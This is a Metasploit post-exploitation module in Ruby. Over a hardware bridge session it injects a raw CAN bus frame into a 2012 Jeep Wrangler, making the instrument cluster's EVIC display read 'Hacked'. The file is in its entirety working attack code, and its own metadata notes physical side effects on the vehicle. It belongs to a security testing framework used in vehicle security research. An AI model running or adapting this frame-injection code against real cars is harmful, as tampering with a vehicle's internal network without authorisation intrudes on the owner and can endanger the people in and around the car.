##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '2012 Jeep Wrangler EVIC Hack Message Display',
        'Description' => ' This module allows you to display the word Hacked on a 2012 Jeep Wrangler EVIC',
        'License' => MSF_LICENSE,
        'Author' => [
          'Chad Gibbon', # Original Author
          'Jay Turla' # Metasploit Module
        ],
        'References' => [
          ['URL', 'https://chadgibbons.com/2013/12/29/hacking-the-jeep-interior-can-bus/'],
          ['URL', 'https://www.youtube.com/watch?v=gHwQwhEFE34']
        ],
        'Platform' => ['hardware'],
        'SessionTypes' => ['hwbridge'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [PHYSICAL_EFFECTS],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])
    ])
  end

  def run
    unless client.automotive
      print_error('The hwbridge requires a functional automotive extention')
      return
    end
    print_status('Sending EVIC with some love...')
    client.automotive.cansend(datastore['CANBUS'], '295', '4861636b65640a')
    print_status('Check the message at the EVIC or the interactive display system in the middle of the instrument cluster')
  end

end
